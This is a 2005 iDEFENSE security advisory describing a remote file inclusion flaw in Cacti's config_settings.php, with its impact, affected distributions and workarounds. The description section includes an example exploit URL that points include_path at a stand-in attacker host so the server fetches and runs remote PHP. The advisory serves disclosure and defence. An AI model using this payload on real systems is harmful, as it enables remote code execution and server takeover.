	Vendor Cacti config_settings.php Remote Code Execution Vulnerability


Multiple Vendor Cacti config_settings.php Remote Code Execution
Vulnerability

iDEFENSE Security Advisory 06.22.05
www.idefense.com/application/poi/display?id=266&type=vulnerabilities
June 22, 2005

I. BACKGROUND

Cacti is a round-robin database (RRD) tool that helps create graphs from

database information and is available on multiple Linux distributions. 

II. DESCRIPTION

Cacti contains an input validation error in the config_settings.php 
script which allows an attacker to include arbitrary PHP code from 
remote sites. This in effect allows arbitrary code execution with the 
privileges of the web server. The vulnerability specifically exists due 
to the script trusting a user supplied include_path variable. The 
following example demonstrates how this might be exploited: 

http://example.com/include/config_settings.php?config[include_path]=http
://attackersite.com/ 

In this way the file "http://attackersite.com/config_arrays.php" will be

included and executed on the vulnerable server with the privileges of 
the web server.

III. ANALYSIS

Successful exploitation of this vulnerability allows a remote attacker 
to gain shell access with the privileges of the web server. An attacker 
can then attempt to escalate privileges using local exploits, possibly 
allowing a full root compromise.

IV. DETECTION

iDEFENSE has confirmed the existence of this vulnerability on Cacti 
0.8.6c. Earlier versions are suspected vulnerable. The following vendors

include susceptible Cacti packages within their respective operating 
system distributions: 

	The Debian Project
	The FreeBSD Project 
	Gentoo Foundation 
	Novell Inc. (SuSE) 

V. WORKAROUND

Require authentication to access the Cacti installation. Restrict access

to web servers using Cacti to only trusted hosts.
